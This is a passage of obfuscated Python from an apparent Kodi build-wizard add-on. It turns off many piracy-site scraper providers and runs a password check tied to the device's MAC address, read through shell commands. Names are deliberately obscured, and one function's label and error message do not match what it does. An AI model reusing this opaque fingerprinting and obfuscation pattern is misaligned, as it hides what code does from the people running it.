		OOOO0OOOOOO00O000 .setSetting ('vel','false')#line:1214
		OOOO0OOOOOO00O000 .setSetting ('vex','false')#line:1215
		OOOO0OOOOOO00O000 .setSetting ('vidc','false')#line:1216
		OOOO0OOOOOO00O000 .setSetting ('w4hd','false')#line:1217
		OOOO0OOOOOO00O000 .setSetting ('wav','false')#line:1218
		OOOO0OOOOOO00O000 .setSetting ('wf','false')#line:1219
		OOOO0OOOOOO00O000 .setSetting ('wse','false')#line:1220
		OOOO0OOOOOO00O000 .setSetting ('wss','false')#line:1221
		OOOO0OOOOOO00O000 .setSetting ('wsse','false')#line:1222
		OOOO0OOOOOO00O000 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1223
		OOOO0OOOOOO00O000 .setSetting ('debrid.only','true')#line:1224
		OOOO0OOOOOO00O000 .setSetting ('hosts.captcha','false')#line:1225
		OOOO0OOOOOO00O000 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1226
		OOOO0OOOOOO00O000 .setSetting ('provider.123moviehd','false')#line:1227
		OOOO0OOOOOO00O000 .setSetting ('provider.300mbdownload','false')#line:1228
		OOOO0OOOOOO00O000 .setSetting ('provider.alltube','false')#line:1229
		OOOO0OOOOOO00O000 .setSetting ('provider.allucde','false')#line:1230
		OOOO0OOOOOO00O000 .setSetting ('provider.animebase','false')#line:1231
		OOOO0OOOOOO00O000 .setSetting ('provider.animeloads','false')#line:1232
		OOOO0OOOOOO00O000 .setSetting ('provider.animetoon','false')#line:1233
		OOOO0OOOOOO00O000 .setSetting ('provider.bnwmovies','false')#line:1234
		OOOO0OOOOOO00O000 .setSetting ('provider.boxfilm','false')#line:1235
		OOOO0OOOOOO00O000 .setSetting ('provider.bs','false')#line:1236
		OOOO0OOOOOO00O000 .setSetting ('provider.cartoonhd','false')#line:1237
		OOOO0OOOOOO00O000 .setSetting ('provider.cdahd','false')#line:1238
		OOOO0OOOOOO00O000 .setSetting ('provider.cdax','false')#line:1239
		OOOO0OOOOOO00O000 .setSetting ('provider.cine','false')#line:1240
		OOOO0OOOOOO00O000 .setSetting ('provider.cinenator','false')#line:1241
		OOOO0OOOOOO00O000 .setSetting ('provider.cmovieshdbz','false')#line:1242
		OOOO0OOOOOO00O000 .setSetting ('provider.coolmoviezone','false')#line:1243
		OOOO0OOOOOO00O000 .setSetting ('provider.ddl','false')#line:1244
		OOOO0OOOOOO00O000 .setSetting ('provider.deepmovie','false')#line:1245
		OOOO0OOOOOO00O000 .setSetting ('provider.ekinomaniak','false')#line:1246
		OOOO0OOOOOO00O000 .setSetting ('provider.ekinotv','false')#line:1247
		OOOO0OOOOOO00O000 .setSetting ('provider.filiser','false')#line:1248
		OOOO0OOOOOO00O000 .setSetting ('provider.filmpalast','false')#line:1249
		OOOO0OOOOOO00O000 .setSetting ('provider.filmwebbooster','false')#line:1250
		OOOO0OOOOOO00O000 .setSetting ('provider.filmxy','false')#line:1251
		OOOO0OOOOOO00O000 .setSetting ('provider.fmovies','false')#line:1252
		OOOO0OOOOOO00O000 .setSetting ('provider.foxx','false')#line:1253
		OOOO0OOOOOO00O000 .setSetting ('provider.freefmovies','false')#line:1254
		OOOO0OOOOOO00O000 .setSetting ('provider.freeputlocker','false')#line:1255
		OOOO0OOOOOO00O000 .setSetting ('provider.furk','false')#line:1256
		OOOO0OOOOOO00O000 .setSetting ('provider.gamatotv','false')#line:1257
		OOOO0OOOOOO00O000 .setSetting ('provider.gogoanime','false')#line:1258
		OOOO0OOOOOO00O000 .setSetting ('provider.gowatchseries','false')#line:1259
		OOOO0OOOOOO00O000 .setSetting ('provider.hackimdb','false')#line:1260
		OOOO0OOOOOO00O000 .setSetting ('provider.hdfilme','false')#line:1261
		OOOO0OOOOOO00O000 .setSetting ('provider.hdmto','false')#line:1262
		OOOO0OOOOOO00O000 .setSetting ('provider.hdpopcorns','false')#line:1263
		OOOO0OOOOOO00O000 .setSetting ('provider.hdstreams','false')#line:1264
		OOOO0OOOOOO00O000 .setSetting ('provider.horrorkino','false')#line:1266
		OOOO0OOOOOO00O000 .setSetting ('provider.iitv','false')#line:1267
		OOOO0OOOOOO00O000 .setSetting ('provider.iload','false')#line:1268
		OOOO0OOOOOO00O000 .setSetting ('provider.iwaatch','false')#line:1269
		OOOO0OOOOOO00O000 .setSetting ('provider.kinodogs','false')#line:1270
		OOOO0OOOOOO00O000 .setSetting ('provider.kinoking','false')#line:1271
		OOOO0OOOOOO00O000 .setSetting ('provider.kinow','false')#line:1272
		OOOO0OOOOOO00O000 .setSetting ('provider.kinox','false')#line:1273
		OOOO0OOOOOO00O000 .setSetting ('provider.lichtspielhaus','false')#line:1274
		OOOO0OOOOOO00O000 .setSetting ('provider.liomenoi','false')#line:1275
		OOOO0OOOOOO00O000 .setSetting ('provider.magnetdl','false')#line:1278
		OOOO0OOOOOO00O000 .setSetting ('provider.megapelistv','false')#line:1279
		OOOO0OOOOOO00O000 .setSetting ('provider.movie2k-ac','false')#line:1280
		OOOO0OOOOOO00O000 .setSetting ('provider.movie2k-ag','false')#line:1281
		OOOO0OOOOOO00O000 .setSetting ('provider.movie2z','false')#line:1282
		OOOO0OOOOOO00O000 .setSetting ('provider.movie4k','false')#line:1283
		OOOO0OOOOOO00O000 .setSetting ('provider.movie4kis','false')#line:1284
		OOOO0OOOOOO00O000 .setSetting ('provider.movieneo','false')#line:1285
		OOOO0OOOOOO00O000 .setSetting ('provider.moviesever','false')#line:1286
		OOOO0OOOOOO00O000 .setSetting ('provider.movietown','false')#line:1287
		OOOO0OOOOOO00O000 .setSetting ('provider.mvrls','false')#line:1289
		OOOO0OOOOOO00O000 .setSetting ('provider.netzkino','false')#line:1290
		OOOO0OOOOOO00O000 .setSetting ('provider.odb','false')#line:1291
		OOOO0OOOOOO00O000 .setSetting ('provider.openkatalog','false')#line:1292
		OOOO0OOOOOO00O000 .setSetting ('provider.ororo','false')#line:1293
		OOOO0OOOOOO00O000 .setSetting ('provider.paczamy','false')#line:1294
		OOOO0OOOOOO00O000 .setSetting ('provider.peliculasdk','false')#line:1295
		OOOO0OOOOOO00O000 .setSetting ('provider.pelisplustv','false')#line:1296
		OOOO0OOOOOO00O000 .setSetting ('provider.pepecine','false')#line:1297
		OOOO0OOOOOO00O000 .setSetting ('provider.primewire','false')#line:1298
		OOOO0OOOOOO00O000 .setSetting ('provider.projectfreetv','false')#line:1299
		OOOO0OOOOOO00O000 .setSetting ('provider.proxer','false')#line:1300
		OOOO0OOOOOO00O000 .setSetting ('provider.pureanime','false')#line:1301
		OOOO0OOOOOO00O000 .setSetting ('provider.putlocker','false')#line:1302
		OOOO0OOOOOO00O000 .setSetting ('provider.putlockerfree','false')#line:1303
		OOOO0OOOOOO00O000 .setSetting ('provider.reddit','false')#line:1304
		OOOO0OOOOOO00O000 .setSetting ('provider.cartoonwire','false')#line:1305
		OOOO0OOOOOO00O000 .setSetting ('provider.seehd','false')#line:1306
		OOOO0OOOOOO00O000 .setSetting ('provider.segos','false')#line:1307
		OOOO0OOOOOO00O000 .setSetting ('provider.serienstream','false')#line:1308
		OOOO0OOOOOO00O000 .setSetting ('provider.series9','false')#line:1309
		OOOO0OOOOOO00O000 .setSetting ('provider.seriesever','false')#line:1310
		OOOO0OOOOOO00O000 .setSetting ('provider.seriesonline','false')#line:1311
		OOOO0OOOOOO00O000 .setSetting ('provider.seriespapaya','false')#line:1312
		OOOO0OOOOOO00O000 .setSetting ('provider.sezonlukdizi','false')#line:1313
		OOOO0OOOOOO00O000 .setSetting ('provider.solarmovie','false')#line:1314
		OOOO0OOOOOO00O000 .setSetting ('provider.solarmoviez','false')#line:1315
		OOOO0OOOOOO00O000 .setSetting ('provider.stream-to','false')#line:1316
		OOOO0OOOOOO00O000 .setSetting ('provider.streamdream','false')#line:1317
		OOOO0OOOOOO00O000 .setSetting ('provider.streamflix','false')#line:1318
		OOOO0OOOOOO00O000 .setSetting ('provider.streamit','false')#line:1319
		OOOO0OOOOOO00O000 .setSetting ('provider.swatchseries','false')#line:1320
		OOOO0OOOOOO00O000 .setSetting ('provider.szukajkatv','false')#line:1321
		OOOO0OOOOOO00O000 .setSetting ('provider.tainiesonline','false')#line:1322
		OOOO0OOOOOO00O000 .setSetting ('provider.tainiomania','false')#line:1323
		OOOO0OOOOOO00O000 .setSetting ('provider.tata','false')#line:1326
		OOOO0OOOOOO00O000 .setSetting ('provider.trt','false')#line:1327
		OOOO0OOOOOO00O000 .setSetting ('provider.tvbox','false')#line:1328
		OOOO0OOOOOO00O000 .setSetting ('provider.ultrahd','false')#line:1329
		OOOO0OOOOOO00O000 .setSetting ('provider.video4k','false')#line:1330
		OOOO0OOOOOO00O000 .setSetting ('provider.vidics','false')#line:1331
		OOOO0OOOOOO00O000 .setSetting ('provider.view4u','false')#line:1332
		OOOO0OOOOOO00O000 .setSetting ('provider.watchseries','false')#line:1333
		OOOO0OOOOOO00O000 .setSetting ('provider.xrysoi','false')#line:1334
		OOOO0OOOOOO00O000 .setSetting ('provider.library','false')#line:1335
def fixfont ():#line:1338
	O000OO0O0O0O0O00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1339
	OO0O0O0O0O0OOO0OO =json .loads (O000OO0O0O0O0O00O );#line:1341
	OOOO0O000000OOOO0 =OO0O0O0O0O0OOO0OO ["result"]["settings"]#line:1342
	O0000OOOOO000000O =[O0OOOO0O0O00O0000 for O0OOOO0O0O00O0000 in OOOO0O000000OOOO0 if O0OOOO0O0O00O0000 ["id"]=="audiooutput.audiodevice"][0 ]#line:1344
	O00000OO00OO0OO0O =O0000OOOOO000000O ["options"];#line:1345
	OOOO0O000OOOOO00O =O0000OOOOO000000O ["value"];#line:1346
	O0O00000O00O00O00 =[OOO00000O0O0O0OOO for (OOO00000O0O0O0OOO ,OOOOOOOOO0OOO000O )in enumerate (O00000OO00OO0OO0O )if OOOOOOOOO0OOO000O ["value"]==OOOO0O000OOOOO00O ][0 ];#line:1348
	OOOO00O00O0OOO00O =(O0O00000O00O00O00 +1 )%len (O00000OO00OO0OO0O )#line:1350
	OOOOO0O0000OOOO0O =O00000OO00OO0OO0O [OOOO00O00O0OOO00O ]["value"]#line:1352
	OOOOOO00000OOO0O0 =O00000OO00OO0OO0O [OOOO00O00O0OOO00O ]["label"]#line:1353
	OOOOOO0OO0O0O0000 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1355
	try :#line:1357
		OOOOO000O0OOOOO0O =json .loads (OOOOOO0OO0O0O0000 );#line:1358
		if OOOOO000O0OOOOO0O ["result"]!=True :#line:1360
			raise Exception #line:1361
	except :#line:1362
		sys .stderr .write ("Error switching audio output device")#line:1363
		raise Exception #line:1364
def parseDOM2 (OO000000OO00OOOOO ,name =u"",attrs ={},ret =False ):#line:1365
	if isinstance (OO000000OO00OOOOO ,str ):#line:1368
		try :#line:1369
			OO000000OO00OOOOO =[OO000000OO00OOOOO .decode ("utf-8")]#line:1370
		except :#line:1371
			OO000000OO00OOOOO =[OO000000OO00OOOOO ]#line:1372
	elif isinstance (OO000000OO00OOOOO ,unicode ):#line:1373
		OO000000OO00OOOOO =[OO000000OO00OOOOO ]#line:1374
	elif not isinstance (OO000000OO00OOOOO ,list ):#line:1375
		return u""#line:1376
	if not name .strip ():#line:1378
		return u""#line:1379
	O0OOOOOOO00OO0O0O =[]#line:1381
	for OOOO00O0OO0O0O0OO in OO000000OO00OOOOO :#line:1382
		O0000O0OO0O0000OO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOOO00O0OO0O0O0OO )#line:1383
		for OO0O0OOOO00O000OO in O0000O0OO0O0000OO :#line:1384
			OOOO00O0OO0O0O0OO =OOOO00O0OO0O0O0OO .replace (OO0O0OOOO00O000OO ,OO0O0OOOO00O000OO .replace ("\n"," "))#line:1385
		OO00OOOO000O0OOO0 =[]#line:1387
		for O00OOOOOO00O00000 in attrs :#line:1388
			O0O00000000OOOO0O =re .compile ('(<'+name +'[^>]*?(?:'+O00OOOOOO00O00000 +'=[\'"]'+attrs [O00OOOOOO00O00000 ]+'[\'"].*?>))',re .M |re .S ).findall (OOOO00O0OO0O0O0OO )#line:1389
			if len (O0O00000000OOOO0O )==0 and attrs [O00OOOOOO00O00000 ].find (" ")==-1 :#line:1390
				O0O00000000OOOO0O =re .compile ('(<'+name +'[^>]*?(?:'+O00OOOOOO00O00000 +'='+attrs [O00OOOOOO00O00000 ]+'.*?>))',re .M |re .S ).findall (OOOO00O0OO0O0O0OO )#line:1391
			if len (OO00OOOO000O0OOO0 )==0 :#line:1393
				OO00OOOO000O0OOO0 =O0O00000000OOOO0O #line:1394
				O0O00000000OOOO0O =[]#line:1395
			else :#line:1396
				OOOO0000OO00O0000 =range (len (OO00OOOO000O0OOO0 ))#line:1397
				OOOO0000OO00O0000 .reverse ()#line:1398
				for O0O000OOO0OOOO0O0 in OOOO0000OO00O0000 :#line:1399
					if not OO00OOOO000O0OOO0 [O0O000OOO0OOOO0O0 ]in O0O00000000OOOO0O :#line:1400
						del (OO00OOOO000O0OOO0 [O0O000OOO0OOOO0O0 ])#line:1401
		if len (OO00OOOO000O0OOO0 )==0 and attrs =={}:#line:1403
			OO00OOOO000O0OOO0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOOO00O0OO0O0O0OO )#line:1404
			if len (OO00OOOO000O0OOO0 )==0 :#line:1405
				OO00OOOO000O0OOO0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOOO00O0OO0O0O0OO )#line:1406
		if isinstance (ret ,str ):#line:1408
			O0O00000000OOOO0O =[]#line:1409
			for OO0O0OOOO00O000OO in OO00OOOO000O0OOO0 :#line:1410
				O00O00O00O000000O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0O0OOOO00O000OO )#line:1411
				if len (O00O00O00O000000O )==0 :#line:1412
					O00O00O00O000000O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0O0OOOO00O000OO )#line:1413
				for O0O0O00O00OOO00OO in O00O00O00O000000O :#line:1414
					OOO0O000OOO00000O =O0O0O00O00OOO00OO [0 ]#line:1415
					if OOO0O000OOO00000O in "'\"":#line:1416
						if O0O0O00O00OOO00OO .find ('='+OOO0O000OOO00000O ,O0O0O00O00OOO00OO .find (OOO0O000OOO00000O ,1 ))>-1 :#line:1417
							O0O0O00O00OOO00OO =O0O0O00O00OOO00OO [:O0O0O00O00OOO00OO .find ('='+OOO0O000OOO00000O ,O0O0O00O00OOO00OO .find (OOO0O000OOO00000O ,1 ))]#line:1418
						if O0O0O00O00OOO00OO .rfind (OOO0O000OOO00000O ,1 )>-1 :#line:1420
							O0O0O00O00OOO00OO =O0O0O00O00OOO00OO [1 :O0O0O00O00OOO00OO .rfind (OOO0O000OOO00000O )]#line:1421
					else :#line:1422
						if O0O0O00O00OOO00OO .find (" ")>0 :#line:1423
							O0O0O00O00OOO00OO =O0O0O00O00OOO00OO [:O0O0O00O00OOO00OO .find (" ")]#line:1424
						elif O0O0O00O00OOO00OO .find ("/")>0 :#line:1425
							O0O0O00O00OOO00OO =O0O0O00O00OOO00OO [:O0O0O00O00OOO00OO .find ("/")]#line:1426
						elif O0O0O00O00OOO00OO .find (">")>0 :#line:1427
							O0O0O00O00OOO00OO =O0O0O00O00OOO00OO [:O0O0O00O00OOO00OO .find (">")]#line:1428
					O0O00000000OOOO0O .append (O0O0O00O00OOO00OO .strip ())#line:1430
			OO00OOOO000O0OOO0 =O0O00000000OOOO0O #line:1431
		else :#line:1432
			O0O00000000OOOO0O =[]#line:1433
			for OO0O0OOOO00O000OO in OO00OOOO000O0OOO0 :#line:1434
				OOOOOO0000O000OOO =u"</"+name #line:1435
				OOOO00O00OO00OOOO =OOOO00O0OO0O0O0OO .find (OO0O0OOOO00O000OO )#line:1437
				O0OO00000OOOO0OO0 =OOOO00O0OO0O0O0OO .find (OOOOOO0000O000OOO ,OOOO00O00OO00OOOO )#line:1438
				O000O000O0O00OO0O =OOOO00O0OO0O0O0OO .find ("<"+name ,OOOO00O00OO00OOOO +1 )#line:1439
				while O000O000O0O00OO0O <O0OO00000OOOO0OO0 and O000O000O0O00OO0O !=-1 :#line:1441
					OOO00000O0OO0O000 =OOOO00O0OO0O0O0OO .find (OOOOOO0000O000OOO ,O0OO00000OOOO0OO0 +len (OOOOOO0000O000OOO ))#line:1442
					if OOO00000O0OO0O000 !=-1 :#line:1443
						O0OO00000OOOO0OO0 =OOO00000O0OO0O000 #line:1444
					O000O000O0O00OO0O =OOOO00O0OO0O0O0OO .find ("<"+name ,O000O000O0O00OO0O +1 )#line:1445
				if OOOO00O00OO00OOOO ==-1 and O0OO00000OOOO0OO0 ==-1 :#line:1447
					OO00O0OO0OOOO0OOO =u""#line:1448
				elif OOOO00O00OO00OOOO >-1 and O0OO00000OOOO0OO0 >-1 :#line:1449
					OO00O0OO0OOOO0OOO =OOOO00O0OO0O0O0OO [OOOO00O00OO00OOOO +len (OO0O0OOOO00O000OO ):O0OO00000OOOO0OO0 ]#line:1450
				elif O0OO00000OOOO0OO0 >-1 :#line:1451
					OO00O0OO0OOOO0OOO =OOOO00O0OO0O0O0OO [:O0OO00000OOOO0OO0 ]#line:1452
				elif OOOO00O00OO00OOOO >-1 :#line:1453
					OO00O0OO0OOOO0OOO =OOOO00O0OO0O0O0OO [OOOO00O00OO00OOOO +len (OO0O0OOOO00O000OO ):]#line:1454
				if ret :#line:1456
					OOOOOO0000O000OOO =OOOO00O0OO0O0O0OO [O0OO00000OOOO0OO0 :OOOO00O0OO0O0O0OO .find (">",OOOO00O0OO0O0O0OO .find (OOOOOO0000O000OOO ))+1 ]#line:1457
					OO00O0OO0OOOO0OOO =OO0O0OOOO00O000OO +OO00O0OO0OOOO0OOO +OOOOOO0000O000OOO #line:1458
				OOOO00O0OO0O0O0OO =OOOO00O0OO0O0O0OO [OOOO00O0OO0O0O0OO .find (OO00O0OO0OOOO0OOO ,OOOO00O0OO0O0O0OO .find (OO0O0OOOO00O000OO ))+len (OO00O0OO0OOOO0OOO ):]#line:1460
				O0O00000000OOOO0O .append (OO00O0OO0OOOO0OOO )#line:1461
			OO00OOOO000O0OOO0 =O0O00000000OOOO0O #line:1462
		O0OOOOOOO00OO0O0O +=OO00OOOO000O0OOO0 #line:1463
	return O0OOOOOOO00OO0O0O #line:1465
def addItem (OO00OOOO0O00O0000 ,OOOOOOO0OO0OO0000 ,O0OOO0O0O0O0O0OOO ,O0000OO0000000OO0 ,OOO0OOOO00O0OOO00 ,description =None ):#line:1467
	if description ==None :description =''#line:1468
	description ='[COLOR white]'+description +'[/COLOR]'#line:1469
	OO00O0OOO0OOOOO0O =sys .argv [0 ]+"?url="+urllib .quote_plus (OOOOOOO0OO0OO0000 )+"&mode="+str (O0OOO0O0O0O0O0OOO )+"&name="+urllib .quote_plus (OO00OOOO0O00O0000 )+"&iconimage="+urllib .quote_plus (O0000OO0000000OO0 )+"&fanart="+urllib .quote_plus (OOO0OOOO00O0OOO00 )#line:1470
	O0O0O0OO0OO0000O0 =True #line:1471
	OOOOOOO0OOOO0OOOO =xbmcgui .ListItem (OO00OOOO0O00O0000 ,iconImage =O0000OO0000000OO0 ,thumbnailImage =O0000OO0000000OO0 )#line:1472
	OOOOOOO0OOOO0OOOO .setInfo (type ="Video",infoLabels ={"Title":OO00OOOO0O00O0000 ,"Plot":description })#line:1473
	OOOOOOO0OOOO0OOOO .setProperty ("fanart_Image",OOO0OOOO00O0OOO00 )#line:1474
	OOOOOOO0OOOO0OOOO .setProperty ("icon_Image",O0000OO0000000OO0 )#line:1475
	O0O0O0OO0OO0000O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00O0OOO0OOOOO0O ,listitem =OOOOOOO0OOOO0OOOO ,isFolder =False )#line:1476
	return O0O0O0OO0OO0000O0 #line:1477
def get_params ():#line:1479
		O0O0O00OOOOOOO00O =[]#line:1480
		OOOO00OOOO0OOOO00 =sys .argv [2 ]#line:1481
		if len (OOOO00OOOO0OOOO00 )>=2 :#line:1482
				O0000O000OO0O0O0O =sys .argv [2 ]#line:1483
				O0OO0OO00OO0O0000 =O0000O000OO0O0O0O .replace ('?','')#line:1484
				if (O0000O000OO0O0O0O [len (O0000O000OO0O0O0O )-1 ]=='/'):#line:1485
						O0000O000OO0O0O0O =O0000O000OO0O0O0O [0 :len (O0000O000OO0O0O0O )-2 ]#line:1486
				OO0OOOOOO000OO0OO =O0OO0OO00OO0O0000 .split ('&')#line:1487
				O0O0O00OOOOOOO00O ={}#line:1488
				for OOOOO0OO00O0O0OOO in range (len (OO0OOOOOO000OO0OO )):#line:1489
						OOO000OOOO000O00O ={}#line:1490
						OOO000OOOO000O00O =OO0OOOOOO000OO0OO [OOOOO0OO00O0O0OOO ].split ('=')#line:1491
						if (len (OOO000OOOO000O00O ))==2 :#line:1492
								O0O0O00OOOOOOO00O [OOO000OOOO000O00O [0 ]]=OOO000OOOO000O00O [1 ]#line:1493
		return O0O0O00OOOOOOO00O #line:1495
def decode (OO000O0OOOO000O0O ,OOO0OOOO0O0OOOOO0 ):#line:1500
    import base64 #line:1501
    O0OOOOO000O0O0OOO =[]#line:1502
    if (len (OO000O0OOOO000O0O ))!=4 :#line:1504
     return 10 #line:1505
    OOO0OOOO0O0OOOOO0 =base64 .urlsafe_b64decode (OOO0OOOO0O0OOOOO0 )#line:1506
    for O0O0O0O00OOOO0OO0 in range (len (OOO0OOOO0O0OOOOO0 )):#line:1508
        O00O0OO0O00OO00O0 =OO000O0OOOO000O0O [O0O0O0O00OOOO0OO0 %len (OO000O0OOOO000O0O )]#line:1509
        O00OOOO000000OOO0 =chr ((256 +ord (OOO0OOOO0O0OOOOO0 [O0O0O0O00OOOO0OO0 ])-ord (O00O0OO0O00OO00O0 ))%256 )#line:1510
        O0OOOOO000O0O0OOO .append (O00OOOO000000OOO0 )#line:1511
    return "".join (O0OOOOO000O0O0OOO )#line:1512
def tmdb_list (O000OO0OO0O0000OO ):#line:1513
    O0OOOO0OO00OOO00O =decode ("7643",O000OO0OO0O0000OO )#line:1516
    return int (O0OOOO0OO00OOO00O )#line:1519
def u_list (OOOOO0000OOO0OO00 ):#line:1520
    from math import sqrt #line:1522
    O0O0000O0O00O0000 =tmdb_list (TMDB_NEW_API )#line:1523
    OOO0O0O0O00OO000O =str ((getHwAddr ('eth0'))*O0O0000O0O00O0000 )#line:1525
    O0000O00O0O0O0O00 =int (OOO0O0O0O00OO000O [1 ]+OOO0O0O0O00OO000O [2 ]+OOO0O0O0O00OO000O [5 ]+OOO0O0O0O00OO000O [7 ])#line:1526
    O000000O00OOOO000 =(ADDON .getSetting ("pass"))#line:1528
    OOOOOOO0O0O0OOOOO =(str (round (sqrt ((O0000O00O0O0O0O00 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1533
    if '.'in OOOOOOO0O0O0OOOOO :#line:1534
     OOOOOOO0O0O0OOOOO =(str (round (sqrt ((O0000O00O0O0O0O00 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1535
    logging .warning (OOOOOOO0O0O0OOOOO )#line:1536
    if O000000O00OOOO000 ==OOOOOOO0O0O0OOOOO :#line:1537
      O000O0O000000O00O =OOOOO0000OOO0OO00 #line:1539
    else :#line:1541
       if STARTP2 ()and STARTP ()=='ok':#line:1542
         return OOOOO0000OOO0OO00 #line:1545
       O000O0O000000O00O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1546
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1547
       sys .exit ()#line:1548
    return O000O0O000000O00O #line:1549
def disply_hwr ():#line:1551
   O00OOOO00O0OO000O =tmdb_list (TMDB_NEW_API )#line:1552
   O00O00O00O00000O0 =str ((getHwAddr ('eth0'))*O00OOOO00O0OO000O )#line:1553
   OO0OO0OO00OO000OO =(O00O00O00O00000O0 [1 ]+O00O00O00O00000O0 [2 ]+O00O00O00O00000O0 [5 ]+O00O00O00O00000O0 [7 ])#line:1560
   OOOOO0O0O00O000O0 =(ADDON .getSetting ("action"))#line:1561
   wiz .setS ('action',str (OO0OO0OO00OO000OO ))#line:1563
def disply_hwr2 ():#line:1564
   O00OO0O0000OOO0O0 =tmdb_list (TMDB_NEW_API )#line:1565
   O000000O0O0O0000O =str ((getHwAddr ('eth0'))*O00OO0O0000OOO0O0 )#line:1566
   O0OO0O0O0OO000000 =(O000000O0O0O0000O [1 ]+O000000O0O0O0000O [2 ]+O000000O0O0O0000O [5 ]+O000000O0O0O0000O [7 ])#line:1573
   O000O000OOOO0O0OO =(ADDON .getSetting ("action"))#line:1574
   xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0OO0O0O0OO000000 )#line:1577
def getHwAddr (O0OOOO0OO0O00O0OO ):#line:1579
   import subprocess ,time #line:1580
   OO0O0OO0OO0OO00O0 ='windows'#line:1581
   if xbmc .getCondVisibility ('system.platform.android'):#line:1582
       OO0O0OO0OO0OO00O0 ='android'#line:1583
   if xbmc .getCondVisibility ('system.platform.android'):#line:1584
     OOOO0O00O0OO0O0OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1585
     O00OO000OO00O0000 =re .compile ('link/ether (.+?) brd').findall (str (OOOO0O00O0OO0O0OO ))#line:1587
     OO0OO00000O0OO000 =0 #line:1588
     for O0OO00O00OOO000OO in O00OO000OO00O0000 :#line:1589
      if O00OO000OO00O0000 !='00:00:00:00:00:00':#line:1590
          OOOOOOO0OO0OO0O0O =O0OO00O00OOO000OO #line:1591
          OO0OO00000O0OO000 =OO0OO00000O0OO000 +int (OOOOOOO0OO0OO0O0O .replace (':',''),16 )#line:1592
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1594
       O0OO0OOOOOOO0OOOO =0 #line:1595
       OO0OO00000O0OO000 =0 #line:1596
       O0O000OOOOOOO0O0O =[]#line:1597
       O00OOOOO0000O0O00 =os .popen ("getmac").read ()#line:1598
       O00OOOOO0000O0O00 =O00OOOOO0000O0O00 .split ("\n")#line:1599
       for O0O0O0O0O00000O0O in O00OOOOO0000O0O00 :#line:1601
            OOO00OO00OO0000O0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0O0O0O0O00000O0O ,re .I )#line:1602
            if OOO00OO00OO0000O0 :#line:1603
                O00OO000OO00O0000 =OOO00OO00OO0000O0 .group ().replace ('-',':')#line:1604
                O0O000OOOOOOO0O0O .append (O00OO000OO00O0000 )#line:1605
                OO0OO00000O0OO000 =OO0OO00000O0OO000 +int (O00OO000OO00O0000 .replace (':',''),16 )#line:1608
   else :#line:1610
       O0OO0OOOOOOO0OOOO =0 #line:1611
       OO0OO00000O0OO000 =0 #line:1612
       while (1 ):#line:1613
         OOOOOOO0OO0OO0O0O =xbmc .getInfoLabel ("network.macaddress")#line:1614
         logging .warning (OOOOOOO0OO0OO0O0O )#line:1615
         if OOOOOOO0OO0OO0O0O !="Busy"and OOOOOOO0OO0OO0O0O !=' עסוק':#line:1616
            break #line:1618
         else :#line:1619
           O0OO0OOOOOOO0OOOO =O0OO0OOOOOOO0OOOO +1 #line:1620
           time .sleep (1 )#line:1621
           if O0OO0OOOOOOO0OOOO >30 :#line:1622
            break #line:1623
       OO0OO00000O0OO000 =OO0OO00000O0OO000 +int (OOOOOOO0OO0OO0O0O .replace (':',''),16 )#line:1624
   return OO0OO00000O0OO000 #line:1626
def getpass ():#line:1627
	disply_hwr2 ()#line:1629
def setpass ():#line:1630
    OOO000O000O00O0OO =xbmcgui .Dialog ()#line:1631
    OO00O0OO00OOO0000 =OOO000O000O00O0OO .numeric (0 ,'הכנס סיסמה')#line:1633
    wiz .setS ('pass',str (OO00O0OO00OOO0000 ))#line:1638
def setuname ():#line:1639
    OOO0OOOO000OOO00O =''#line:1640
    O0OO000O0OOO00000 =xbmc .Keyboard (OOO0OOOO000OOO00O ,'הכנס שם משתמש')#line:1641
    O0OO000O0OOO00000 .doModal ()#line:1642
    if O0OO000O0OOO00000 .isConfirmed ():#line:1643
           OOO0OOOO000OOO00O =O0OO000O0OOO00000 .getText ()#line:1644
           wiz .setS ('user',str (OOO0OOOO000OOO00O ))#line:1645
def powerkodi ():#line:1646
    os ._exit (1 )#line:1647
def buffer1 ():#line:1649
	O0OOOO00OO0O0OO00 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1650
	O0O00OO00OO0O00OO =xbmc .getInfoLabel ("System.Memory(total)")#line:1651
	O0000OO000OO0OOO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1652
	OOO0O00O0O00OOO00 =re .sub ('[^0-9]','',O0000OO000OO0OOO0 )#line:1653
	OOO0O00O0O00OOO00 =int (OOO0O00O0O00OOO00 )/3 #line:1654
	O0O0O0O0O0OO0O000 =OOO0O00O0O00OOO00 *1024 *1024 #line:1655
	try :O00O0O0OO0O0OOOO0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1656
	except :O00O0O0OO0O0OOOO0 =16 #line:1657
	OO0O00OOOO000OO00 =DIALOG .yesno ('FREE MEMORY: '+str (O0000OO000OO0OOO0 ),'Based on your free Memory your optimal buffersize is: '+str (OOO0O00O0O00OOO00 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1660
	if OO0O00OOOO000OO00 ==1 :#line:1661
